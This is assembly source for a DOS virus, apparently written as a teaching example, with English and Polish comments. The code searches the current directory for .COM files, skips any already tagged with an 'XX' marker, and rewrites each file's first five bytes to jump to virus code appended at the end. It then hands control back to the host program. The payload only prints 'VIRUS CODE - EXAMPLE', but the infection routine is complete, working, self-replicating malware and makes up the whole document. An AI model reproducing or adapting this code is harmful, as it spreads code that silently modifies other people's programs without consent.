model tiny
.code
 org 100h
Start:
  jmp dalej
   DB 'XX'
  dalej:           ; 5 virus id (virus change first 5 bytes of application to jump to infected part + 'XX' as id)

 call etyk1
 etyk1: 
 pop bp
 sub bp, 8          ; get virus start point(it will be different for each infection - virus add to ending)  // 8 bytes from beggining (5 id bytes + call)

 mov di, 100h
 push di           ; load start point address ( last ret will jump to this address)

 mov si, bp
 add si, offset oldjump-offset start    ; old start point(relative address)

 movsw
 movsw
 movsb             ; copy 5 bytes - override virus jump with application code (fix application in RAM)

 mov dx, bp
 add dx, offset maska - offset start  ; start infecting com files in directory
 call FindFirst                  
 ret

 FindFirst:
  MOV AH, 4EH                      ; search file 
  MOV CX, 7                        ; all attributes
  FindNext:
	  INT 21H
	  JC RunVirus                         ; if no file left - finish
	  CALL Infection                  ; if found -> infect	  
	  cmp ax, 1
	  je RunVirus
	MOV AH, 4FH                      ; search for next victim
  JMP FindNext
  
  
  RunVirus:
  ; virus code goes here, this virus print text
  mov ah,09
  mov dx,offset tekst-offset start
  add dx,bp
  int 21h
  
  ; and wait for kaypress
  mov ah,00
  int 16h
 RET  ; jump to real application code

 Infection:       
  MOV AX,3D02H                      ; open file
  MOV DX,09EH                       ; file name from DTA block
  INT 21H 
  XCHG AX,BX                        ; BX - file handler

  MOV AH,3FH                       ; read first 5 bytes
  MOV CX,05                        ; 
  mov dx,bp
  add DX,OFFSET oldjump-offset start            ; save them at virus ending 
  INT 21H

  mov ax,word ptr [bp + offset oldjump - offset start+3]  ; check if file is already infected
  cmp ax,'XX'
  JE QuitInfect                    ; if yes then skip file                                   
  JMP InfectCOM                    ; file was not infected so spread virus   
  QuitInfect:
   mov AX, 0					; return false
   RET
  InfectCOM:        
		; 1. save first 5 bytes to buffer (end of virus code in ram)
		; 2. Override first 5 bytes of application with jump to relative virus address
		; 3. Write virus at the end of infected file
	  mov si,bp
	  mov di,bp
	  add si,offset oldjump - offset start
	  add di,offset bufor - offset start
	  mov ah,0E9h
	  mov [di],ah
	  inc di
	  mov AH,42H
	  mov al,2
	  xor cx,cx
	  xor dx,dx
	  int 21h
	  mov word ptr [di],ax
	  add di,2
	  mov ax,'XX'
	  mov word ptr [di],ax
	  

	  mov AH,42H
	  mov al,0
	  xor cx,cx
	  xor dx,dx
	  int 21h

	  MOV AH,40H                        
	  MOV cx,5
	  MOV DX,OFFSET bufor-offset start  
	  add dx,bp
	  INT 21H

	  mov AH,42H
	  mov al,2
	  xor cx,cx
	  xor dx,dx
	  int 21h

	  MOV AH,40H                       
	  MOV Cx,offset koniec-offset start
	  MOV DX,OFFSET start-offset start 
	  add dx,bp
	  INT 21H
	  mov ax, 1
	RET ; return to "find next"
 maska DB "*.COM",0
 tekst DB "VIRUS CODE - EXAMPLE$"
 OldJump DB 0CDH,020H,0,0,0         ; zapamiêtane 3-pierwsze bajty
 koniec:
 bufor db 0,0,0,0,0
END START